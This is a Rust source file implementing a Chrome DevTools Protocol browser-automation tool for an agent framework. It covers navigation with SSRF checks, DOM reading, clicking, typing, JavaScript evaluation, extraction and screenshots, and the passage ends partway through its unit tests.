use super::{
    AsyncTool, ToolContext,
    utils::http::{SsrfPolicy, validate_public_url},
};
use anyhow::{Context, Result, bail};
use futures_util::{SinkExt, StreamExt};
use reqwest::Url;
use schemars::JsonSchema;
use scraper::{ElementRef, Html, Selector};
use serde::Deserialize;
use std::sync::atomic::{AtomicU64, Ordering};
use std::{
    path::PathBuf,
    sync::{Arc, OnceLock},
    time::Duration,
};
use tokio::{
    sync::Mutex,
    time::{Instant, sleep},
};
use tokio_tungstenite::{connect_async, tungstenite::Message};
use tracing::{debug, info, warn};

use crate::core::config::expand_tilde;
use crate::core::processes::{ProcessRegistry, SpawnOptions};

const DEFAULT_WAIT_SECS: u64 = 10;
/// How long to wait for a spawned CDP Chrome to become ready.
const CDP_START_TIMEOUT_SECS: u64 = 10;
const MAX_EXTRACT_ELEMENTS: usize = 200;

pub struct Tool;

#[derive(Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum BrowserAction {
    /// Navigate to a URL (optionally waiting for a CSS selector to appear).
    Goto,
    /// Extract visible text from the page or a specific CSS selector.
    Read,
    /// Click an element matching a CSS selector.
    Click,
    /// Type text into an input/textarea matching a CSS selector.
    Type,
    /// Execute JavaScript in the page context and return its JSON result.
    Eval,
    /// Extract structured data (text, attributes, href) from elements matching a CSS selector, parsed server-side with the `scraper` crate.
    Extract,
    /// List visible interactive elements (inputs, buttons, links, etc.) with their attributes and suggested CSS selectors.
    Find,
    /// Capture a PNG screenshot of the current viewport (or element) to a file.
    Screenshot,
    /// Show current URL, title, and session status.
    Status,
    /// Close the active browser session and free resources.
    Close,
}

#[derive(Deserialize, JsonSchema)]
pub struct BrowserArgs {
    /// Action to perform.
    pub action: BrowserAction,
    /// Target URL (required for `goto`).
    #[serde(default)]
    pub url: Option<String>,
    /// CSS selector to target (used by `read`, `click`, `type`, `extract`, `screenshot`, or as wait condition in `goto`).
    #[serde(default)]
    pub selector: Option<String>,
    /// Text to type (required for `type`).
    #[serde(default)]
    pub text: Option<String>,
    /// Clear existing input before typing (default: true).
    #[serde(default = "default_true")]
    pub clear: bool,
    /// JavaScript snippet to execute (required for `eval`).
    #[serde(default)]
    pub script: Option<String>,
    /// Relative workspace path to save screenshot PNG (optional for `screenshot`; defaults to a temp file).
    #[serde(default)]
    pub path: Option<String>,
    /// Max seconds to wait for `selector` to appear (default: 10).
    #[serde(default)]
    pub wait_secs: Option<u64>,
}

fn default_true() -> bool {
    true
}

/// Locate a Chrome/Chromium binary to spawn a managed CDP instance.
///
/// Resolution order: `CHROME_BIN` env var, then the first match on `PATH`,
/// then a couple of common install directories.
fn find_chrome_binary() -> Option<PathBuf> {
    const NAMES: &[&str] = &[
        "google-chrome-stable",
        "google-chrome",
        "chromium",
        "chromium-browser",
    ];
    if let Ok(raw) = std::env::var("CHROME_BIN")
        && !raw.trim().is_empty()
    {
        let path = PathBuf::from(raw.trim());
        if path.is_file() {
            return Some(path);
        }
    }
    if let Some(path_var) = std::env::var_os("PATH") {
        for dir in std::env::split_paths(&path_var) {
            for name in NAMES {
                let candidate = dir.join(name);
                if candidate.is_file() {
                    return Some(candidate);
                }
            }
        }
    }
    for name in NAMES {
        for dir in ["/usr/bin", "/usr/local/bin"] {
            let candidate = PathBuf::from(dir).join(name);
            if candidate.is_file() {
                return Some(candidate);
            }
        }
    }
    None
}

/// Encode a string as a safe JavaScript string literal (double-quoted).
///
/// Uses JSON string escaping, which is a strict subset of valid JS string
/// literal syntax. This prevents injection when interpolating user-supplied
/// CSS selectors into `Runtime.evaluate` expressions.
fn js_str(s: &str) -> String {
    serde_json::to_string(s).expect("&str always serializes to JSON")
}

/// Drives Chrome over the Chrome DevTools Protocol (CDP).
///
/// Either attaches to an already-running Chrome (started with
/// `--remote-debugging-port=<port>`), or — when nothing is listening on that
/// port — spawns a visible Chrome instance as a background job through the
/// [`ProcessRegistry`]. Only the managed instance is stopped by
/// [`CdpSession::close`]; the user's own browser is never killed.
struct CdpSession {
    ws: Mutex<
        tokio_tungstenite::WebSocketStream<
            tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
        >,
    >,
    next_id: AtomicU64,
    /// Id of the background job for the Chrome instance Archon spawned
    /// itself (`None` when attached to a user-launched browser).
    managed_job: Option<String>,
}

impl CdpSession {
    /// Discover a page target on `localhost:{port}` and connect via WebSocket.
    async fn connect(port: u16) -> Result<Self> {
        let targets_url = format!("http://127.0.0.1:{port}/json");
        let targets: Vec<serde_json::Value> = reqwest::get(&targets_url)
            .await
            .with_context(|| {
                format!(
                    "Failed to query CDP targets at {targets_url}. \n\
                     Ensure Chrome is running with --remote-debugging-port={port}"
                )
            })?
            .json()
            .await
            .context("Failed to parse CDP target list")?;

        let target = targets
            .iter()
            .find(|t| t.get("type").and_then(|v| v.as_str()) == Some("page"))
            .context("No 'page' target found in CDP target list. Is a tab open?")?;

        let ws_url = target
            .get("webSocketDebuggerUrl")
            .and_then(|v| v.as_str())
            .context("CDP target has no webSocketDebuggerUrl")?;

        info!("Connecting to CDP WebSocket: {ws_url}");
        let (ws, _response) = connect_async(ws_url.to_string())
            .await
            .with_context(|| format!("WebSocket connection to CDP failed at {ws_url}"))?;

        let session = Self {
            ws: Mutex::new(ws),
            next_id: AtomicU64::new(1),
            managed_job: None,
        };

        // Enable the CDP domains we need.
        session
            .send_cmd("Page.enable", serde_json::json!({}))
            .await?;
        session
            .send_cmd("Runtime.enable", serde_json::json!({}))
            .await?;
        session
            .send_cmd("DOM.enable", serde_json::json!({}))
            .await?;

        info!("CDP session connected and domains enabled");
        Ok(session)
    }

    /// Send a CDP command and wait for the matching response by `id`.
    async fn send_cmd(&self, method: &str, params: serde_json::Value) -> Result<serde_json::Value> {
        let id = self.next_id.fetch_add(1, Ordering::Relaxed);
        let msg = serde_json::json!({
            "id": id,
            "method": method,
            "params": params,
        });

        let mut ws = self.ws.lock().await;
        ws.send(Message::Text(msg.to_string()))
            .await
            .with_context(|| format!("Failed to send CDP command {method}"))?;

        // Read frames until we get the response with our id.
        loop {
            let frame = ws
                .next()
                .await
                .ok_or_else(|| anyhow::anyhow!("WebSocket connection closed"))?
                .with_context(|| format!("WebSocket error during {method}"))?;

            let text = frame
                .to_text()
                .with_context(|| format!("CDP response to {method} was not text"))?;
            let json: serde_json::Value =
                serde_json::from_str(text).context("Failed to parse CDP response")?;

            if json.get("id").and_then(|v| v.as_u64()) == Some(id) {
                if let Some(error) = json.get("error") {
                    bail!("CDP error in {method}: {error}");
                }
                return Ok(json
                    .get("result")
                    .cloned()
                    .unwrap_or(serde_json::Value::Null));
            }
            // Event or unrelated response — skip
        }
    }

    /// Evaluate a JavaScript expression and return the result value.
    async fn evaluate_raw(&self, expression: &str) -> Result<serde_json::Value> {
        let result = self
            .send_cmd(
                "Runtime.evaluate",
                serde_json::json!({
                    "expression": expression,
                    "returnByValue": true,
                }),
            )
            .await?;

        if let Some(exception) = result.get("exceptionDetails") {
            let desc = exception
                .pointer("/exception/description")
                .and_then(|d| d.as_str())
                .unwrap_or("unknown JS error");
            bail!("JS evaluation failed: {desc}");
        }

        Ok(result
            .pointer("/result/value")
            .cloned()
            .unwrap_or(serde_json::Value::Null))
    }

    fn label(&self) -> String {
        match &self.managed_job {
            Some(job_id) => format!("CDP (managed, job {job_id})"),
            None => "CDP (attached)".into(),
        }
    }

    async fn goto(&self, url: &str) -> Result<()> {
        self.send_cmd("Page.navigate", serde_json::json!({"url": url}))
            .await?;
        // Poll document.readyState until the page is fully loaded.
        let deadline = Instant::now() + Duration::from_secs(30);
        loop {
            let state = self.evaluate_raw("document.readyState").await?;
            if state.as_str() == Some("complete") {
                return Ok(());
            }
            if Instant::now() > deadline {
                bail!("Timed out waiting for page to load: {url}");
            }
            sleep(Duration::from_millis(100)).await;
        }
    }

    /// List the first `limit` visible interactive elements with their attributes
    /// and a suggested CSS selector. Used for diagnostics and the `find` action.
    async fn list_interactive_elements(&self, limit: usize) -> Result<Vec<serde_json::Value>> {
        // NOTE: JS object braces are escaped as {{ }} for Rust's format! macro.
        let expr = format!(
            r#"Array.from(document.querySelectorAll(
                'input, textarea, select, button, a[href], [role="button"], [role="link"], [role="combobox"], [contenteditable="true"]'
            ))
            .filter(el => {{
                const r = el.getBoundingClientRect();
                return r.width > 0 && r.height > 0;
            }})
            .slice(0, {limit})
            .map(el => ({{
                tag: el.tagName.toLowerCase(),
                id: el.id || '',
                name: el.name || '',
                type: el.type || '',
                role: el.getAttribute('role') || '',
                placeholder: el.placeholder || '',
                label: (el.labels && el.labels[0] && el.labels[0].textContent) || '',
                href: el.tagName === 'A' ? (el.getAttribute('href') || '').slice(0, 100) : '',
                text: (el.textContent || el.value || '').trim().slice(0, 60),
                suggested_selector: el.id ? '#' + el.id :
                    (el.name ? el.tagName.toLowerCase() + '[name="' + el.name + '"]' :
                        el.tagName.toLowerCase() === 'a' ? 'a[href="' + (el.getAttribute('href') || '') + '"]' :
                            el.tagName.toLowerCase() + (el.type ? '[type="' + el.type + '"]' : ''))
            }}))"#
        );
        let val = self.evaluate_raw(&expr).await?;
        match val {
            serde_json::Value::Array(items) => Ok(items),
            other => {
                // `evaluate_raw` may return a JSON-encoded array as a string
                // (when the result isn't natively serializable).
                if let Some(s) = other.as_str()
                    && let Ok(parsed) = serde_json::from_str::<Vec<serde_json::Value>>(s)
                {
                    return Ok(parsed);
                }
                Ok(vec![])
            }
        }
    }

    async fn wait_for_selector(&self, sel: &str, timeout: Duration) -> Result<()> {
        let escaped = js_str(sel);
        let expr = format!("document.querySelector({escaped}) !== null");
        let deadline = Instant::now() + timeout;
        loop {
            if self.evaluate_raw(&expr).await?.as_bool() == Some(true) {
                return Ok(());
            }
            if Instant::now() > deadline {
                // Provide diagnostic info so the caller can self-correct.
                let elements = self
                    .list_interactive_elements(15)
                    .await
                    .unwrap_or_else(|e| {
                        warn!("failed to enumerate elements for diagnostics: {e}");
                        vec![]
                    });
                let el_list = serde_json::to_string_pretty(&elements)
                    .unwrap_or_else(|_| "(unable to enumerate elements)".into());

                bail!(
                    "Element '{sel}' not found within {}s.\n\n\
                     Available interactive elements (first 15):\n{}",
                    timeout.as_secs(),
                    el_list
                );
            }
            sleep(Duration::from_millis(200)).await;
        }
    }

    async fn read_selector_text(&self, sel: &str, timeout: Duration) -> Result<String> {
        self.wait_for_selector(sel, timeout).await?;
        let escaped = js_str(sel);
        let expr = format!("document.querySelector({escaped})?.textContent ?? ''");
        let val = self.evaluate_raw(&expr).await?;
        Ok(val.as_str().unwrap_or("").to_string())
    }

    async fn read_page_text(&self) -> Result<String> {
        let val = self.evaluate_raw("document.body?.innerText ?? ''").await?;
        Ok(val.as_str().unwrap_or("").to_string())
    }

    async fn get_outer_html(&self) -> Result<String> {
        let val = self
            .evaluate_raw("document.documentElement.outerHTML")
            .await?;
        val.as_str()
            .map(str::to_owned)
            .ok_or_else(|| anyhow::anyhow!("document outerHTML was not a string"))
    }

    async fn click(&self, sel: &str) -> Result<()> {
        let escaped = js_str(sel);
        let expr = format!(
            r#"(() => {{
                const el = document.querySelector({escaped});
                if (!el) return null;
                el.scrollIntoView({{block:'center'}});
                const r = el.getBoundingClientRect();
                return {{x: r.x + r.width/2, y: r.y + r.height/2}};
            }})()"#
        );
        let coords = self.evaluate_raw(&expr).await?;
        let x = coords
            .get("x")
            .and_then(|v| v.as_f64())
            .ok_or_else(|| anyhow::anyhow!("Element '{sel}' not found"))?;
        let y = coords
            .get("y")
            .and_then(|v| v.as_f64())
            .ok_or_else(|| anyhow::anyhow!("Element '{sel}' not found"))?;

        self.send_cmd(
            "Input.dispatchMouseEvent",
            serde_json::json!({
                "type": "mousePressed", "x": x, "y": y,
                "button": "left", "clickCount": 1
            }),
        )
        .await?;
        self.send_cmd(
            "Input.dispatchMouseEvent",
            serde_json::json!({
                "type": "mouseReleased", "x": x, "y": y,
                "button": "left", "clickCount": 1
            }),
        )
        .await?;
        Ok(())
    }

    async fn type_text(&self, sel: &str, text: &str, clear: bool, timeout: Duration) -> Result<()> {
        self.wait_for_selector(sel, timeout).await?;
        let escaped = js_str(sel);

        // Focus the element.
        self.evaluate_raw(&format!("document.querySelector({escaped})?.focus()"))
            .await?;

        // Clear if requested.
        if clear {
            self.evaluate_raw(&format!(
                r#"(() => {{
                    const el = document.querySelector({escaped});
                    if (el) {{ el.value = ''; el.dispatchEvent(new Event('input', {{bubbles:true}})); }}
                }})()"#
            ))
            .await?;
        }

        // Insert text via CDP Input domain.
        self.send_cmd("Input.insertText", serde_json::json!({"text": text}))
            .await?;
        Ok(())
    }

    async fn evaluate(&self, script: &str) -> Result<serde_json::Value> {
        // `Runtime.evaluate` runs in the global scope where `return` is a
        // SyntaxError. If the script uses top-level `return`, wrap it in an IIFE.
        let expr = if has_return_statement(script) {
            format!("(() => {{ {script} }})()")
        } else {
            script.to_string()
        };
        self.evaluate_raw(&expr).await
    }

    async fn screenshot(&self, sel: Option<&str>) -> Result<Vec<u8>> {
        let params = if let Some(s) = sel {
            let escaped = js_str(s);
            let box_expr = format!(
                r#"(() => {{
                    const el = document.querySelector({escaped});
                    if (!el) return null;
                    el.scrollIntoView();
                    const r = el.getBoundingClientRect();
                    return {{x:r.x, y:r.y, width:r.width, height:r.height}};
                }})()"#
            );
            let rect = self.evaluate_raw(&box_expr).await?;
            serde_json::json!({
                "format": "png",
                "clip": {
                    "x": rect.get("x").cloned().unwrap_or(serde_json::json!(0)),
                    "y": rect.get("y").cloned().unwrap_or(serde_json::json!(0)),
                    "width": rect.get("width").cloned().unwrap_or(serde_json::json!(1440)),
                    "height": rect.get("height").cloned().unwrap_or(serde_json::json!(900)),
                    "scale": 1
                }
            })
        } else {
            serde_json::json!({"format": "png"})
        };

        let result = self.send_cmd("Page.captureScreenshot", params).await?;
        let b64 = result
            .get("data")
            .and_then(|d| d.as_str())
            .context("CDP screenshot response had no 'data' field")?;
        use base64::Engine;
        base64::engine::general_purpose::STANDARD
            .decode(b64)
            .context("Failed to decode CDP screenshot base64")
    }

    async fn current_url(&self) -> Result<String> {
        let val = self.evaluate_raw("location.href").await?;
        Ok(val.as_str().unwrap_or("").to_string())
    }

    async fn title(&self) -> Result<String> {
        let val = self.evaluate_raw("document.title").await?;
        Ok(val.as_str().unwrap_or("").to_string())
    }

    async fn is_alive(&self) -> bool {
        self.evaluate_raw("'alive'").await.is_ok()
    }

    async fn close(&self) -> Result<()> {
        if let Some(job_id) = &self.managed_job {
            // Archon owns this Chrome instance — stop it with the session.
            match ProcessRegistry::global().kill(job_id).await {
                Ok(msg) => debug!("Stopped managed CDP Chrome: {msg}"),
                Err(e) => debug!("Failed to stop managed CDP Chrome job {job_id}: {e}"),
            }
        } else {
            // Attached to the user's own browser — never kill it. The
            // WebSocket connection closes when the CdpSession is dropped.
            debug!("CDP session closed (Chrome left running)");
        }
        Ok(())
    }
}

pub struct BrowserRegistry {
    session: Mutex<Option<Arc<CdpSession>>>,
}

impl BrowserRegistry {
    pub fn global() -> Arc<Self> {
        static INSTANCE: OnceLock<Arc<BrowserRegistry>> = OnceLock::new();
        INSTANCE
            .get_or_init(|| {
                Arc::new(Self {
                    session: Mutex::new(None),
                })
            })
            .clone()
    }

    /// `true` if a CDP endpoint is already serving on `port`.
    async fn cdp_reachable(port: u16) -> bool {
        reqwest::get(format!("http://127.0.0.1:{port}/json"))
            .await
            .is_ok_and(|r| r.status().is_success())
    }

    /// Wait for a freshly spawned Chrome to expose its CDP endpoint on `port`.
    /// Bails early if the Chrome job exited before it was ready.
    async fn wait_for_cdp_ready(port: u16, job_id: &str) -> Result<()> {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_millis(500))
            .build()?;
        let url = format!("http://127.0.0.1:{port}/json");
        let deadline = Instant::now() + Duration::from_secs(CDP_START_TIMEOUT_SECS);
        let reg = ProcessRegistry::global();

        while Instant::now() < deadline {
            let job_finished = reg
                .list()
                .await
                .into_iter()
                .find(|j| j.id == job_id)
                .is_some_and(|j| j.finished);
            if job_finished {
                let out = reg.output(job_id, 20).await.unwrap_or_default();
                bail!(
                    "Managed Chrome exited before its CDP endpoint was ready (job {job_id}).\n{out}"
                );
            }
            if let Ok(resp) = client.get(&url).send().await
                && resp.status().is_success()
            {
                return Ok(());
            }
            sleep(Duration::from_millis(100)).await;
        }

        let out = reg.output(job_id, 20).await.unwrap_or_default();
        bail!("Timed out waiting for managed Chrome to serve CDP at {url}\n{out}");
    }

    /// Connect to Chrome over CDP on `port`.
    ///
    /// Attaches if a Chrome with remote debugging is already listening;
    /// otherwise spawns a visible Chrome instance as a background job (via
    /// [`ProcessRegistry::start_with`]) and attaches once it is ready.
    async fn connect_cdp(port: u16, profile_dir: &str) -> Result<Arc<CdpSession>> {
        // Fast path: attach to an already-running Chrome.
        if Self::cdp_reachable(port).await {
            return Ok(Arc::new(CdpSession::connect(port).await?));
        }

        let chrome_bin = find_chrome_binary().with_context(|| {
            format!(
                "Nothing is listening on CDP port {port} and no Chrome/Chromium binary was found. \n\
                 Install one (e.g. google-chrome-stable), set CHROME_BIN, or start Chrome manually \n\
                 with --remote-debugging-port={port}"
            )
        })?;

        let profile = expand_tilde(profile_dir);
        std::fs::create_dir_all(&profile).with_context(|| {
            format!("Failed to create CDP profile directory {}", profile.display())
        })?;

        let args: Vec<String> = vec![
            format!("--remote-debugging-port={port}"),
            format!("--user-data-dir={}", profile.display()),
            "--remote-allow-origins=*".into(),
            "--no-first-run".into(),
            "--no-default-browser-check".into(),
            "--window-size=1440,900".into(),
            "about:blank".into(),
        ];

        let reg = ProcessRegistry::global();
        let job = reg
            .start_with(&SpawnOptions {
                command: chrome_bin.to_string_lossy().into_owned(),
                args: args.clone(),
                cwd: None,
                env: vec![],
                source: "browser".into(),
            })
            .await?;
        info!(
            "Spawning managed Chrome for CDP (job {}): {} {}",
            job.id,
            chrome_bin.display(),
            args.join(" ")
        );

        let connected = async {
            Self::wait_for_cdp_ready(port, &job.id).await?;
            CdpSession::connect(port).await
        }
        .await;

        match connected {
            Ok(mut session) => {
                session.managed_job = Some(job.id);
                Ok(Arc::new(session))
            }
            Err(e) => {
                // Don't leave a half-started Chrome running.
                let _ = reg.kill(&job.id).await;
                Err(e)
            }
        }
    }

    async fn get_or_init(&self, port: u16, cdp_profile_dir: &str) -> Result<Arc<CdpSession>> {
        let mut guard = self.session.lock().await;

        if let Some(ref existing) = *guard {
            if existing.is_alive().await {
                return Ok(Arc::clone(existing));
            }
            warn!("Existing browser session is stale; reconnecting...");
            if let Some(stale) = guard.take() {
                let _ = stale.close().await;
            }
        }

        let session = Self::connect_cdp(port, cdp_profile_dir).await?;
        let cloned = Arc::clone(&session);
        *guard = Some(session);
        Ok(cloned)
    }

    pub async fn status(&self) -> String {
        let guard = self.session.lock().await;
        let Some(ref session) = *guard else {
            return "Browser status: inactive (no open session).".into();
        };
        let url = session.current_url().await.unwrap_or_default();
        let title = session.title().await.unwrap_or_default();
        let label = session.label();
        format!("Browser status: active ({label})\nURL: {url}\nTitle: {title}")
    }

    pub async fn close(&self) -> Result<String> {
        let existing = self.session.lock().await.take();
        match existing {
            Some(session) => {
                let _ = session.close().await;
                Ok("Browser session closed.".into())
            }
            None => Ok("No active browser session.".into()),
        }
    }

    /// Called by `CoreEngine::run` on shutdown.
    pub async fn shutdown(&self) {
        if let Some(session) = self.session.lock().await.take() {
            info!("Shutting down active browser session...");
            let _ = session.close().await;
        }
    }
}

/// Returns `true` if the script contains a *top-level* `return` statement.
///
/// A `return` only counts as top-level when it is **not** nested inside a
/// function body (a `function (...) { ... }`, `function { ... }`, or
/// `=> { ... }` body). This correctly ignores `return`s that belong to an
/// inner callback (for example
/// `[1,2,3].map(function (x) { return x * 2; })`), which would otherwise
/// suppress the required top-level `return` and make the whole expression
/// evaluate to `undefined` (serialised as `null`).
///
/// A `return` inside a *plain* block is still top-level, e.g.
/// `if (x) { return 1; }` or `{ return 'a'; }`.
///
/// String literals, template literals, and line/block comments are skipped,
/// so the substring "return" (e.g. inside a CSS selector such as
/// `.return-btn`) never triggers a false positive.
fn has_return_statement(script: &str) -> bool {
    let chars: Vec<char> = script.chars().collect();
    let n = chars.len();
    let is_ident = |ch: char| ch.is_ascii_alphanumeric() || ch == '_';

    let mut i = 0;
    let mut paren_depth: i32 = 0;
    let mut brace_stack: Vec<bool> = Vec::new(); // true = function body
    let mut fn_awaiting_paren = false; // saw `function`; a param-list `(` may follow
    let mut fn_param_depth: Option<i32> = None; // open depth of a function param list
    let mut next_brace_is_fn = false; // the next `{` opens a function body

    while i < n {
        let c = chars[i];

        // Line comment: skip to the end of the line.
        if c == '/' && i + 1 < n && chars[i + 1] == '/' {
            while i < n && chars[i] != '\n' {
                i += 1;
            }
            continue;
        }
        // Block comment: skip to the closing `*/`.
        if c == '/' && i + 1 < n && chars[i + 1] == '*' {
            i += 2;
            while i + 1 < n && !(chars[i] == '*' && chars[i + 1] == '/') {
                i += 1;
            }
            i += 2; // consume the closing `*/` (or run off the end)
            continue;
        }
        // String / template literal: skip to the matching (unescaped) quote.
        if c == '"' || c == '\'' || c == '`' {
            let quote = c;
            i += 1;
            while i < n && chars[i] != quote {
                if chars[i] == '\\' {
                    i += 1; // skip the escaped character
                }
                i += 1;
            }
            i += 1; // skip the closing quote (or run off the end)
            continue;
        }
        if c.is_whitespace() {
            i += 1;
            continue;
        }

        // `function` keyword (whole word).
        if c == 'f'
            && chars[i..]
                .iter()
                .collect::<String>()
                .starts_with("function")
            && chars.get(i + 8).map(|ch| !is_ident(*ch)).unwrap_or(true)
        {
            fn_awaiting_paren = true;
            next_brace_is_fn = true; // covers a paramless `function { ... }`
            i += 8;
            continue;
        }

        // Arrow `=>` (a `=` immediately followed by `>`).
        if c == '=' && i + 1 < n && chars[i + 1] == '>' {
            next_brace_is_fn = true;
            i += 2;
            continue;
        }

        match c {
            '(' => {
                paren_depth += 1;
                if fn_awaiting_paren {
                    fn_param_depth = Some(paren_depth);
                    fn_awaiting_paren = false;
                }
                i += 1;
            }
            ')' => {
                paren_depth -= 1;
                if matches!(fn_param_depth, Some(d) if paren_depth == d - 1) {
                    next_brace_is_fn = true;
                    fn_param_depth = None;
                }
                i += 1;
            }
            '{' => {
                brace_stack.push(next_brace_is_fn);
                next_brace_is_fn = false;
                fn_awaiting_paren = false;
                i += 1;
            }
            '}' => {
                brace_stack.pop();
                i += 1;
            }
            'r' if paren_depth == 0 => {
                let is_word = chars.get(i + 6).map(|ch| !is_ident(*ch)).unwrap_or(true);
                if chars[i..].iter().collect::<String>().starts_with("return") && is_word {
                    // A top-level `return` unless we are nested inside a
                    // function body (a callback), in which case it is not the
                    // top-level return the driver needs.
                    if !brace_stack.iter().any(|&b| b) {
                        return true;
                    }
                }
                i += 1;
            }
            _ => {
                // Any other token ends a pending `function`/`=>` body.
                fn_awaiting_paren = false;
                next_brace_is_fn = false;
                i += 1;
            }
        }
    }

    false
}

/// Extract structured data (inner text, all attributes, and a resolved
/// `href`) from every element matching `selector` in an HTML `source`.
///
/// This is the CSS-selector extraction engine behind the `extract` action.
/// It parses the rendered HTML once with `scraper` and returns a JSON object:
/// `{ selector, count, truncated, items: [{ text, attrs, href }] }`.
fn extract_from_html(source: &str, selector: &str) -> Result<serde_json::Value> {
    let document = Html::parse_document(source);
    let sel = Selector::parse(selector)
        .map_err(|e| anyhow::anyhow!("Invalid CSS selector '{selector}': {e}"))?;
    let anchor_sel = Selector::parse("a[href]").expect("'a[href]' is a valid CSS selector");

    let matches: Vec<ElementRef> = document.select(&sel).collect();
    let truncated = matches.len() > MAX_EXTRACT_ELEMENTS;

    let items: Vec<serde_json::Value> = matches
        .iter()
        .take(MAX_EXTRACT_ELEMENTS)
        .map(|element| {
            let text: String = element.text().collect();
            let attrs: serde_json::Map<String, serde_json::Value> = element
                .value()
                .attrs
                .iter()
                .map(|(name, value)| {
                    (
                        name.local.to_string(),
                        serde_json::Value::String(value.to_string()),
                    )
                })
                .collect();
            let href = element.attr("href").map(str::to_owned).or_else(|| {
                element
                    .select(&anchor_sel)
                    .next()
                    .and_then(|a| a.attr("href").map(str::to_owned))
            });
            serde_json::json!({
                "text": text.trim(),
                "attrs": attrs,
                "href": href,
            })
        })
        .collect();

    Ok(serde_json::json!({
        "selector": selector,
        "count": items.len(),
        "truncated": truncated,
        "items": items,
    }))
}

impl AsyncTool for Tool {
    const NAME: &'static str = "browser";
    const DESCRIPTION: &'static str = "Controls a visible Chrome browser via CDP to render JS pages, interact with DOM elements, evaluate JavaScript, extract structured data, list interactive elements, and capture screenshots. Attaches to a running Chrome on browser.cdp_port, or spawns a visible Chrome instance if none is listening.";
    type Args = BrowserArgs;

    async fn execute(args: Self::Args, ctx: &ToolContext) -> Result<String> {
        let reg = BrowserRegistry::global();
        let wait_secs = args.wait_secs.unwrap_or(DEFAULT_WAIT_SECS).clamp(1, 60);
        let cdp_port = ctx.config.browser.cdp_port;
        let profile_dir = &ctx.config.browser.cdp_user_data_dir;

        match args.action {
            BrowserAction::Close => reg.close().await,

            BrowserAction::Status => Ok(reg.status().await),

            BrowserAction::Goto => {
                let raw_url = args
                    .url
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'url' is required for browser:goto")?;

                let parsed =
                    Url::parse(raw_url).with_context(|| format!("Invalid URL: '{raw_url}'"))?;

                let policy = SsrfPolicy::from_config(
                    ctx.config.app.http_allow_private,
                    &ctx.config.app.http_allowed_cidrs,
                );
                validate_public_url(&parsed, &policy).await?;

                let session = reg.get_or_init(cdp_port, profile_dir).await?;
                session.goto(parsed.as_str()).await?;

                if let Some(sel) = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                {
                    session
                        .wait_for_selector(sel, Duration::from_secs(wait_secs))
                        .await?;
                }

                let final_url = session.current_url().await?;
                let title = session.title().await.unwrap_or_default();
                Ok(format!("Navigated to: {final_url}\nTitle: {title}"))
            }

            BrowserAction::Read => {
                let session = reg.get_or_init(cdp_port, profile_dir).await?;
                let sel = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty());
                let text = if let Some(s) = sel {
                    session
                        .read_selector_text(s, Duration::from_secs(wait_secs))
                        .await?
                } else {
                    session.read_page_text().await?
                };
                let url = session.current_url().await.unwrap_or_default();
                let title = session.title().await.unwrap_or_default();
                Ok(format!("URL: {url}\nTitle: {title}\n\n{}", text.trim()))
            }

            BrowserAction::Click => {
                let sel = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'selector' is required for browser:click")?;
                let session = reg.get_or_init(cdp_port, profile_dir).await?;
                session.click(sel).await?;
                let url = session.current_url().await.unwrap_or_default();
                Ok(format!("Clicked '{sel}'. Current URL: {url}"))
            }

            BrowserAction::Type => {
                let sel = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'selector' is required for browser:type")?;
                let text = args
                    .text
                    .as_deref()
                    .context("'text' is required for browser:type")?;
                let session = reg.get_or_init(cdp_port, profile_dir).await?;
                session
                    .type_text(sel, text, args.clear, Duration::from_secs(wait_secs))
                    .await?;
                Ok(format!(
                    "Typed {} chars into '{sel}'.",
                    text.chars().count()
                ))
            }

            BrowserAction::Eval => {
                let script = args
                    .script
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'script' is required for browser:eval")?;
                let session = reg.get_or_init(cdp_port, profile_dir).await?;
                let result = session.evaluate(script).await?;
                Ok(serde_json::to_string_pretty(&result)?)
            }

            BrowserAction::Extract => {
                let selector = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'selector' is required for browser:extract")?;
                let session = reg.get_or_init(cdp_port, profile_dir).await?;
                let source = session.get_outer_html().await?;
                let result = extract_from_html(&source, selector)?;
                Ok(serde_json::to_string_pretty(&result)?)
            }

            BrowserAction::Find => {
                let session = reg.get_or_init(cdp_port, profile_dir).await?;
                let elements = session.list_interactive_elements(30).await?;
                let url = session.current_url().await.unwrap_or_default();
                let title = session.title().await.unwrap_or_default();
                let result = serde_json::json!({
                    "url": url,
                    "title": title,
                    "count": elements.len(),
                    "elements": elements
                });
                Ok(serde_json::to_string_pretty(&result)?)
            }

            BrowserAction::Screenshot => {
                let session = reg.get_or_init(cdp_port, profile_dir).await?;
                let sel = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty());
                let png = session.screenshot(sel).await?;

                let out_path: PathBuf = match args
                    .path
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                {
                    Some(rel) => ctx.resolve_new_path(rel)?,
                    None => std::env::temp_dir().join(format!(
                        "archon-screenshot-{}.png",
                        chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
                    )),
                };
                if let Some(parent) = out_path.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                std::fs::write(&out_path, &png).with_context(|| {
                    format!("Failed to write screenshot to {}", out_path.display())
                })?;

                Ok(format!(
                    "Saved screenshot ({} bytes) to {}",
                    png.len(),
                    out_path.display()
                ))
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn has_return_statement_negative_cases() {
        assert!(!has_return_statement(
            "document.querySelector('.return-btn')"
        ));
        assert!(!has_return_statement("let returnCount = 0;"));
        assert!(!has_return_statement("el.setAttribute('data-return', '1')"));
    }

    #[test]
    fn has_return_statement_positive_cases() {
        assert!(has_return_statement("return 42;"));
        assert!(has_return_statement("return 42"));
        assert!(has_return_statement("let x = 1; return x;"));
        assert!(has_return_statement("{ return 'a'; }"));
        assert!(has_return_statement("if (x) return y; else return z;"));
    }

    #[test]
